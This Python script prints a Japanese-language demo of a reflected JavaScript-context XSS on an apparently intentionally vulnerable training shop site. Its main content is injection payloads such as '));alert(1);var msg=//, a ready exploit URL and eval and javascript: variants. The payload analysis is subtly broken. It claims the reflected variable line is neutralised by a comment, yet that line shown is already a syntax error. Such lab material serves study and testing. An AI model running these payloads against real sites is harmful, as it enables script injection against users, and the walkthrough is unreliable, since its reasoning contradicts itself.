#!/usr/bin/env python3
"""
レビュー編集JavaScript反射XSS脆弱性デモンストレーション

この脆弱性の概要:
- レビュー編集成功後のテロップ表示でJavaScript反射XSS
- 2つの反射箇所があり、間に変数定義が挟まる特殊な構造
- < と > がブロックリストのため、通常のタグベースXSSは不可
- 巧妙なJavaScript構文操作が必要
"""

def main():
    print("=== レビュー編集JavaScript反射XSS脆弱性デモ ===\n")
    
    print("脆弱性の詳細:")
    print("• レビュー編集成功後にテロップ表示機能あり")
    print("• commentパラメータがJavaScript内に反射")
    print("• 2つの反射箇所: console.log() と showNotification()")
    print("• 反射箇所間に変数定義が挟まる特殊構造")
    print("• ブロックリスト: < と > の2文字のみ")
    print()
    
    print("脆弱なJavaScript構造:")
    print("```javascript")
    print("console.log('[1つ目の反射]');")
    print("")
    print("var msg = '[変数定義でも反射]';")
    print("")  
    print("showNotification('コメント：' + '[2つ目の反射]' + ' を書き込みました。');")
    print("```")
    print()
    
    print("攻撃の課題:")
    print("• 通常のペイロードでは構文エラーで実行されない")
    print("• console.log()を正常に終了させる必要がある")
    print("• 変数定義を考慮したペイロード構築が必要")
    print("• showNotification()までコードが到達する必要がある")
    print()
    
    print("失敗するペイロード例:")
    print("1. '));alert(1);//")
    print("   → var msg = ''');alert(1);//'; で構文エラー")
    print()
    print("2. ');alert(1);//")  
    print("   → var msg = ''');alert(1);//'; で構文エラー")
    print()
    
    print("成功するペイロード:")
    print("'));alert(1);var msg=//")
    print()
    
    print("ペイロード解析:")
    print("```javascript")
    print("// 1つ目の反射:")
    print("console.log(''));alert(1);var msg=//');")
    print("//           ↑ここで文字列終了、alert実行、var再定義")
    print("")
    print("// 元の変数定義が無効化される:")
    print("// var msg = ''));alert(1);var msg=//';")  
    print("//                              ↑コメントアウトで無効")
    print("")
    print("// 2つ目の反射は到達しないか、エラーでも問題なし")
    print("```")
    print()
    
    print("攻撃手順:")
    print("1. 管理者でログイン")
    print("2. レビュー編集画面でcommentに攻撃ペイロードを入力:")
    print("   comment: '));alert(1);var msg=//")
    print("3. レビューを更新")
    print("4. 管理画面リダイレクト時にXSS発火")
    print()
    
    print("検証用URL:")
    print("https://vulnerable-shopping-mall21.vercel.app/admin/reviews?updated_comment='));alert(1);var%20msg=//")
    print()
    
    print("ブロックリスト回避:")
    print("• < > を使用しないJavaScriptベースの攻撃")
    print("• タグ注入ではなく、既存script内での構文操作")
    print("• 変数定義とコメントアウトを活用")
    print()
    
    print("その他の有効なペイロード:")
    print("1. '));confirm('XSS');var msg=//")
    print("2. '));document.location='javascript:alert(1)';var msg=//")
    print("3. '));eval('alert(1)');var msg=//")
    print("4. '));window['alert'](1);var msg=//")

if __name__ == "__main__":
    main()